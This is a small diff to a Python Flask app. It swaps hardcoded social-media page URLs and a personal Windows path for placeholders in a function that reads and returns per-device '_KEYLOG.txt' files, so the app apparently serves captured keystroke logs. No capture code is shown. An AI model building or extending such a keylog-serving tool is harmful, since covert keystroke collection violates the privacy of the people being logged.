@@ -10,8 +10,8 @@ app = Flask(__name__)
 app.secret_key = os.urandom(24)  # Secure session key
 
 # -------------------- General Declarations --------------------
-FACEBOOK_PAGE_URL = "https://www.facebook.com/ZeropointSEC/"
-INSTAGRAM_PAGE_URL = "https://www.instagram.com/youthindiafoundation/"
+FACEBOOK_PAGE_URL = "https://www.facebook.com/<your_fb_page>"
+INSTAGRAM_PAGE_URL = "https://www.instagram.com/<your_insta_page>"
 
 # OAuth Endpoints
 GOOGLE_AUTH_URL = "https://accounts.google.com/o/oauth2/auth"
@@ -509,7 +509,7 @@ def fetch_log():
         for _ in dev_name: 
             if _ == '\ / : * ? " < > |':
                 dev_name.replace(_,"_")
-        with open('C:/Users/Rithin/OneDrive/Desktop/{0}_KEYLOG.txt'.format(dev_name), 'r') as f:
+        with open('C:/<your_file_path>/Desktop/{0}_KEYLOG.txt'.format(dev_name), 'r') as f:
             content = f.read()
         return content
     except Exception as e:
